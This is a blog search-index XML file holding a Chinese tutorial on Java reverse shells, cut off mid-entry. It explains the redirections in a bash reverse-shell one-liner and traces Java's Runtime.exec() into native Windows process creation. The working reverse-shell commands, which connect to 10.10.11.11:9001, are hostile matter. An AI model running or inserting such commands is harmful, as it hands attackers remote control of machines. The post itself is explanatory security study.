<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>javaRveShell基础</title>
    <link href="/2025/08/03/javaRveShell%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/08/03/javaRveShell%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="javaRveShell"><a href="#javaRveShell" class="headerlink" title="javaRveShell"></a>javaRveShell</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直研究 java RCE，证明的方法总是执行 <code>calc</code> 在本地机器上弹出计算器，就缺乏了对于各种 RCE 漏洞利用的研究，写篇文章记录一下 java 各种反弹 shell 的操作。</p><h2 id="linux-反弹命令解析"><a href="#linux-反弹命令解析" class="headerlink" title="linux 反弹命令解析"></a>linux 反弹命令解析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1<br></code></pre></td></tr></table></figure><h3 id="符号作用"><a href="#符号作用" class="headerlink" title="&amp; 符号作用"></a>&amp; 符号作用</h3><p>没有 <code>&amp;</code> 时，<code>&lt;</code> 或 <code>&gt;</code> 后面跟的是一个 <span style="font-weight:bold;">文件名</span>。<br>1&gt; out.txt : 将 stdout 输出到名为 out.txt 的文件。<br>当有 <code>&amp;</code> 时，<code>&lt;</code> 或 <code>&gt;</code> 后面跟的是一个 <span style="font-weight:bold;">文件描述符</span>。</p><blockquote><p><code>&gt;&amp;m</code> 的意思是“…到文件描述符 m 所指向的文件”。<br><code>&lt;&amp;m</code> 的意思是“…从文件描述符 m 所指向的文件”。</p></blockquote><h3 id="命令解读"><a href="#命令解读" class="headerlink" title="命令解读"></a>命令解读</h3><p>对这条命令的完整解读，他的完整版本是 </p><p><code>bash -i &gt; /dev/tcp/10.10.11.11/9001 2&gt;&amp;1 0&gt;&amp;1</code></p><p>linux 从左向右处理这条命令</p><p><code>bash -i</code> 启动一个新的交互 shell</p><p><code>&gt;</code> : 是 <code>1&gt;</code> 的简写，把标准输出重定向到 <code>/dev/tcp/10.10.11.11/9001</code> 这台伪设备，此时状态</p><ul><li><code>fd 1 (stdout)</code> -&gt; <code>网络连接 (TCP Socket)</code></li><li><code>fd 2 (stderr)</code> -&gt; <code>屏幕</code> (尚未改变)</li><li><code>fd 0 (stdin)</code> -&gt; <code>键盘</code> (尚未改变)</li></ul><p><code>2&gt;&amp;1</code> : 这得益于 <code>&amp;</code> 符号的作用，它把重定向的目标改为了 <code>文件描述符</code> , 实际效果就是 把错误 <code>(stderr)</code> 重定向到 <code>1</code> 文件描述符所指向的地方，在第一步 <code>&gt;</code> 中, <code>1</code> 这个标准输出描述符已经指向了 <code>/dev/tcp/10.10.11.11/9001</code> 伪设备，所以到这里的状态</p><ul><li><code>fd 1 (stdout)</code> -&gt; <code>网络连接 (TCP Socket)</code></li><li><code>fd 2 (stderr)</code> -&gt; <code>网络连接 (TCP Socket)</code> (与 fd 1 指向同一个地方)</li><li><code>fd 0 (stdin)</code> -&gt; <code>键盘</code> (尚未改变)</li></ul><p><code>0&gt;&amp;1</code> : 与上边讲的一样，把输入重定向到了 <code>1</code> 文件描述符所指向的位置 ， 最终状态</p><ul><li><code>fd 1 (stdout)</code> -&gt; <code>网络连接 (TCP Socket)</code></li><li><code>fd 2 (stderr)</code> -&gt; <code>网络连接 (TCP Socket)</code> (与 fd 1 指向同一个地方)</li><li><code>fd 0 (stdin)</code> -&gt;  <code>网络连接 (TCP Socket)</code> (与 fd 1 指向同一个地方)</li></ul><p>由此，我们就把 <code>bash -i</code> 新开起的交互 shell 的所有输入 <code>(stdin)</code> 和输出(<code>stdout</code>, <code>stderr</code>) 全部交给了 <code>tcp伪设备</code> , 也就实现了反弹 shell</p><blockquote><p><code>&gt;&amp;</code> <strong>合并输出重定向</strong> ：包含了 标准输出(<code>stdout</code>)和错误输出(<code>stderr</code>)</p><p><code>&lt;&amp;</code> <strong>读写重定向</strong> ：包含标准输出(<code>stdout</code>) 和 标准输入(<code>stdin</code>) </p></blockquote><p><strong>补充知识点</strong></p><p><code>0&gt;&amp;1</code> 与 <code>0&lt;&amp;1</code> 作用是完全相同的，是不是看到这个很困惑，我来解释一下</p><p><code>0&gt;&amp;1</code> : 这个好理解，我们上边讲过了，将文件描述符 <code>0</code>(stdin)的输出，重定向到文件描述符 <code>1</code>(stdout)<strong>当前所指向的同一个地方</strong>，最终 <code>0</code> 和 <code>1</code> 的文件描述符指向同一文件或管道</p><p><code>0&lt;&amp;1</code> : 让文件描述符 <code>0</code>(stdin) <strong>从</strong> 文件描述符 <code>1</code>(stdout)<strong>当前所指向的同一个地方</strong> 读取输入, 最终 <code>0</code> 和 <code>1</code> 的文件描述符指向同一文件或管道</p><p>两者的结果是相同的</p><p>我们的反弹 shell 语句的等价语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&lt;&amp;1<br><br></code></pre></td></tr></table></figure><h2 id="Runtime-exec"><a href="#Runtime-exec" class="headerlink" title="Runtime.exec()"></a>Runtime.exec()</h2><h3 id="windows-平台"><a href="#windows-平台" class="headerlink" title="windows 平台"></a>windows 平台</h3><p>在 Runtime 中 exec() 有 6 个重载方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730092637049.png" alt="image-20250730092637049"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String command)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">return</span> exec(command, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String command, String[] envp)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">return</span> exec(command, envp, <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String command, String[] envp, File dir)</span><br>    <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">if</span> (command.length() == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Empty command&quot;</span>);<br><br>    <span class="hljs-type">StringTokenizer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringTokenizer</span>(command);<br>    String[] cmdarray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[st.countTokens()];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; st.hasMoreTokens(); i++)<br>        cmdarray[i] = st.nextToken();<br>    <span class="hljs-keyword">return</span> exec(cmdarray, envp, dir);<br>&#125;<br><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmdarray[])</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">return</span> exec(cmdarray, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String[] cmdarray, String[] envp)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">return</span> exec(cmdarray, envp, <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String[] cmdarray, String[] envp, File dir)</span><br>    <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdarray)<br>        .environment(envp)<br>        .directory(dir)<br>        .start();<br>&#125;<br></code></pre></td></tr></table></figure><p>看的出来无论我们传入的是字符串 <code>String</code> 还是 字符数组 <code>String[]</code> 最终调用都是 <code>public Process exec(String[] cmdarray, String[] envp, File dir)</code> 方法，由他再去调用 <code>ProcessBuilder()</code> 方法</p><p>我们先来简单调试一下 exec()，看他是如何运行的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;ipconfig /all&quot;</span>).getInputStream();<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> bytesRead;<br>        <span class="hljs-keyword">while</span> ((bytesRead = inputStream.read(bytes)) != -<span class="hljs-number">1</span>) &#123;<br>            System.out.print(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, bytesRead, <span class="hljs-string">&quot;GBK&quot;</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730093316430.png" alt="image-20250730093316430"></p><p>步入，来到 java.lang.Runtime#exec(java.lang.String) </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730093447082.png" alt="image-20250730093447082"></p><p>方法重载来到 java.lang.Runtime#exec(java.lang.String, java.lang.String [], java.io.File) 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730093613968.png" alt="image-20250730093613968"></p><p>利用 java.util.StringTokenizer 这个类处理字符串，按照 <code> \t\n\r\f</code> 进行分割 也就是（<code>空格</code> <code>\t</code> <code>\n</code> <code>\r</code> <code>\f</code>）分割</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730094420823.png" alt="image-20250730094420823"></p><p>所以 <code>ifconfig /all</code> 命令会 java.util.StringTokenizer#nextTokens 被分割为 <code>ifconfig</code> <code>/all</code> 两个 token</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">nextToken</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * If next position already computed in hasMoreElements() and</span><br><span class="hljs-comment">         * delimiters have changed between the computation and this invocation,</span><br><span class="hljs-comment">         * then use the computed value.</span><br><span class="hljs-comment">         */</span><br><br>    currentPosition = (newPosition &gt;= <span class="hljs-number">0</span> &amp;&amp; !delimsChanged) ?<br>        newPosition : skipDelimiters(currentPosition);<br><br>    <span class="hljs-comment">/* Reset these anyway */</span><br>    delimsChanged = <span class="hljs-literal">false</span>;<br>    newPosition = -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (currentPosition &gt;= maxPosition)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchElementException</span>();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> currentPosition;<br>    currentPosition = scanToken(currentPosition);<br>    <span class="hljs-keyword">return</span> str.substring(start, currentPosition);<br>&#125;<br></code></pre></td></tr></table></figure><p>封装为数组，并传递给 java.lang.Runtime#exec(java.lang.String [], java.lang.String [], java.io.File)</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730100349241.png" alt="image-20250730100349241"></p><p>创建 ProcessBuilder 对象，最后 start() </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730100544640.png" alt="image-20250730100544640"></p><p>在 start() 方法中，把 cmdarray [0] 赋值给了 prog</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730101317718.png" alt="image-20250730101317718"></p><p>然后调用 java.lang.ProcessImpl#start 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730101550293.png" alt="image-20250730101550293"></p><p>在 start() 静态方法中处理了 environment 等变量，最后调用了 ProcessImpl 的构造方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730102321264.png" alt="image-20250730102321264"></p><p>调用 java.lang.ProcessImpl#createCommandLine 把数组变为命令字符串</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730103225574.png" alt="image-20250730103225574"></p><p>最后调用 natvie creat 创建进程，执行命令，并返回句柄</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730110356425.png" alt="image-20250730110356425"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730110456523.png" alt="image-20250730110456523"></p><p>native 源码：<a href="https://github.com/unofficial-openjdk/openjdk/blob/e59bd5b27066bb2eb77828110ee585b1598ba636/src/java.base/windows/native/libjava/ProcessImpl_md.c#L361C1-L361C34">Java_java_lang_ProcessImpl_create</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">Java_java_lang_ProcessImpl_create</span>(JNIEnv *env, jclass ignored,<br>                                  jstring cmd,<br>                                  jstring envBlock,<br>                                  jstring dir,<br>                                  jlongArray stdHandles,<br>                                  jboolean redirectErrorStream)<br>&#123;<br>    jlong ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">NULL</span> &amp;&amp; stdHandles != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-type">const</span> jchar *pcmd = (*env)-&gt;<span class="hljs-built_in">GetStringChars</span>(env, cmd, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span> (pcmd != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-type">const</span> jchar *penvBlock = (envBlock != <span class="hljs-literal">NULL</span>)<br>                ? (*env)-&gt;<span class="hljs-built_in">GetStringChars</span>(env, envBlock, <span class="hljs-literal">NULL</span>)<br>                : <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">if</span> (!(*env)-&gt;<span class="hljs-built_in">ExceptionCheck</span>(env)) &#123;<br>                <span class="hljs-type">const</span> jchar *pdir = (dir != <span class="hljs-literal">NULL</span>)<br>                    ? (*env)-&gt;<span class="hljs-built_in">GetStringChars</span>(env, dir, <span class="hljs-literal">NULL</span>)<br>                    : <span class="hljs-literal">NULL</span>;<br>                <span class="hljs-keyword">if</span> (!(*env)-&gt;<span class="hljs-built_in">ExceptionCheck</span>(env)) &#123;<br>                    jlong *handles = (*env)-&gt;<span class="hljs-built_in">GetLongArrayElements</span>(env, stdHandles, <span class="hljs-literal">NULL</span>);<br>                    <span class="hljs-keyword">if</span> (handles != <span class="hljs-literal">NULL</span>) &#123;<br>                        ret = <span class="hljs-built_in">processCreate</span>(<br>                            env,<br>                            pcmd,<br>                            penvBlock,<br>                            pdir,<br>                            handles,<br>                            redirectErrorStream);<br>                        (*env)-&gt;<span class="hljs-built_in">ReleaseLongArrayElements</span>(env, stdHandles, handles, <span class="hljs-number">0</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (pdir != <span class="hljs-literal">NULL</span>)<br>                        (*env)-&gt;<span class="hljs-built_in">ReleaseStringChars</span>(env, dir, pdir);<br>                &#125;<br>                <span class="hljs-keyword">if</span> (penvBlock != <span class="hljs-literal">NULL</span>)<br>                    (*env)-&gt;<span class="hljs-built_in">ReleaseStringChars</span>(env, envBlock, penvBlock);<br>            &#125;<br>            (*env)-&gt;<span class="hljs-built_in">ReleaseStringChars</span>(env, cmd, pcmd);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://github.com/unofficial-openjdk/openjdk/blob/e59bd5b27066bb2eb77828110ee585b1598ba636/src/java.base/windows/native/libjava/ProcessImpl_md.c#L266">processCreate</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> jlong <span class="hljs-title">processCreate</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    JNIEnv *env,</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">const</span> jchar *pcmd,</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">const</span> jchar *penvBlock,</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">const</span> jchar *pdir,</span></span><br><span class="hljs-params"><span class="hljs-function">    jlong *handles,</span></span><br><span class="hljs-params"><span class="hljs-function">    jboolean redirectErrorStream)</span></span><br><span class="hljs-function"></span>&#123;<br>    jlong ret = <span class="hljs-number">0L</span>;<br>    STARTUPINFOW si = &#123;<span class="hljs-built_in">sizeof</span>(si)&#125;;<br><br>    <span class="hljs-comment">/* Handles for which the inheritance flag must be restored. */</span><br>    HANDLE stdIOE[HANDLE_STORAGE_SIZE] = &#123;<br>        <span class="hljs-comment">/* Current process standard IOE handles: JDK-7147084 */</span><br>        INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE,<br>        <span class="hljs-comment">/* Child process IOE handles: JDK-6921885 */</span><br>        (HANDLE)handles[<span class="hljs-number">0</span>], (HANDLE)handles[<span class="hljs-number">1</span>], (HANDLE)handles[<span class="hljs-number">2</span>]&#125;;<br>    BOOL inherit[HANDLE_STORAGE_SIZE] = &#123;<br>        FALSE, FALSE, FALSE,<br>        FALSE, FALSE, FALSE&#125;;<br><br>    <span class="hljs-comment">/* These three should not be closed by CloseHandle! */</span><br>    stdIOE[<span class="hljs-number">0</span>] = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);<br>    stdIOE[<span class="hljs-number">1</span>] = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);<br>    stdIOE[<span class="hljs-number">2</span>] = <span class="hljs-built_in">GetStdHandle</span>(STD_ERROR_HANDLE);<br><br>    <span class="hljs-built_in">prepareIOEHandleState</span>(stdIOE, inherit);<br>    &#123;<br>        <span class="hljs-comment">/* Input */</span><br>        STDHOLDER holderIn = &#123;&#123;INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE&#125;, OFFSET_READ&#125;;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">initHolder</span>(env, &amp;handles[<span class="hljs-number">0</span>], &amp;holderIn, &amp;si.hStdInput)) &#123;<br><br>            <span class="hljs-comment">/* Output */</span><br>            STDHOLDER holderOut = &#123;&#123;INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE&#125;, OFFSET_WRITE&#125;;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">initHolder</span>(env, &amp;handles[<span class="hljs-number">1</span>], &amp;holderOut, &amp;si.hStdOutput)) &#123;<br><br>                <span class="hljs-comment">/* Error */</span><br>                STDHOLDER holderErr = &#123;&#123;INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE&#125;, OFFSET_WRITE&#125;;<br>                BOOL success;<br>                <span class="hljs-keyword">if</span> (redirectErrorStream) &#123;<br>                    si.hStdError = si.hStdOutput;<br>                    <span class="hljs-comment">/* Here we set the error stream to [ProcessBuilder.NullInputStream.INSTANCE]</span><br><span class="hljs-comment">                       value. That is in accordance with Java Doc for the redirection case.</span><br><span class="hljs-comment">                       The Java file for the [ handles[2] ] will be closed in ANY case. It is not</span><br><span class="hljs-comment">                       a handle leak. */</span><br>                    handles[<span class="hljs-number">2</span>] = JAVA_INVALID_HANDLE_VALUE;<br>                    success = TRUE;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    success = <span class="hljs-built_in">initHolder</span>(env, &amp;handles[<span class="hljs-number">2</span>], &amp;holderErr, &amp;si.hStdError);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (success) &#123;<br>                    PROCESS_INFORMATION pi;<br>                    DWORD processFlag = CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT;<br><br>                    <span class="hljs-comment">/* If the standard I/O is inherited, CREATE_NO_WINDOW must not be used. */</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetConsoleWindow</span>() != <span class="hljs-literal">NULL</span> &amp;&amp;<br>                        (si.hStdInput  == stdIOE[<span class="hljs-number">0</span>] ||<br>                         si.hStdOutput == stdIOE[<span class="hljs-number">1</span>] ||<br>                         si.hStdError  == (redirectErrorStream ? stdIOE[<span class="hljs-number">1</span>] : stdIOE[<span class="hljs-number">2</span>])))<br>                    &#123;<br>                        processFlag &amp;= ~CREATE_NO_WINDOW;<br>                    &#125;<br><br>                    si.dwFlags = STARTF_USESTDHANDLES;<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreateProcessW</span>(<br>                        <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* executable name */</span><br>                        (LPWSTR)pcmd,     <span class="hljs-comment">/* command line */</span><br>                        <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* process security attribute */</span><br>                        <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* thread security attribute */</span><br>                        TRUE,             <span class="hljs-comment">/* inherits system handles */</span><br>                        processFlag,      <span class="hljs-comment">/* selected based on exe type */</span><br>                        (LPVOID)penvBlock,<span class="hljs-comment">/* environment block */</span><br>                        (LPCWSTR)pdir,    <span class="hljs-comment">/* change to the new current directory */</span><br>                        &amp;si,              <span class="hljs-comment">/* (in)  startup information */</span><br>                        &amp;pi))             <span class="hljs-comment">/* (out) process information */</span><br>                    &#123;<br>                        <span class="hljs-built_in">win32Error</span>(env, <span class="hljs-string">L&quot;CreateProcess&quot;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-built_in">closeSafely</span>(pi.hThread);<br>                        ret = (jlong)pi.hProcess;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-built_in">releaseHolder</span>(ret == <span class="hljs-number">0</span>, &amp;holderErr);<br>                <span class="hljs-built_in">releaseHolder</span>(ret == <span class="hljs-number">0</span>, &amp;holderOut);<br>            &#125;<br>            <span class="hljs-built_in">releaseHolder</span>(ret == <span class="hljs-number">0</span>, &amp;holderIn);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">restoreIOEHandleState</span>(stdIOE, inherit);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>在其中调用了 <a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw">CreateProcessW 函数（processthreadsapi.h） - Win32 apps | Microsoft Learn</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">CreateProcessW</span>(<br>    <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* executable name */</span><br>    (LPWSTR)pcmd,     <span class="hljs-comment">/* command line */</span><br>    <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* process security attribute */</span><br>    <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* thread security attribute */</span><br>    TRUE,             <span class="hljs-comment">/* inherits system handles */</span><br>    processFlag,      <span class="hljs-comment">/* selected based on exe type */</span><br>    (LPVOID)penvBlock,<span class="hljs-comment">/* environment block */</span><br>    (LPCWSTR)pdir,    <span class="hljs-comment">/* change to the new current directory */</span><br>    &amp;si,              <span class="hljs-comment">/* (in)  startup information */</span><br>    &amp;pi))             <span class="hljs-comment">/* (out) process information */</span><br></code></pre></td></tr></table></figure><p>到这里 windows 就开始执行我们传入的命令了</p><p>返回句柄</p><ul><li><code>handle</code> (<code>1820</code>) 是一个指向 <strong>新创建的子进程本身</strong> 的句柄，允许父进程管理和控制子进程的生命周期。</li></ul><ul><li><code>stdHandles</code> 数组中的句柄 (<code>1832, 1836, 1844</code>) 是与子进程进行 <strong>输入&#x2F;输出通信</strong> 的管道&#x2F;文件句柄。（stdin, stdout, stderr）</li></ul><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730142526350.png" alt="image-20250730142526350"></p><p>也就是在 windows 平台真正执行命令的方法就是 <code>java.lang.ProcessImpl#create</code> 这个 native 方法</p><p>调用站</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td 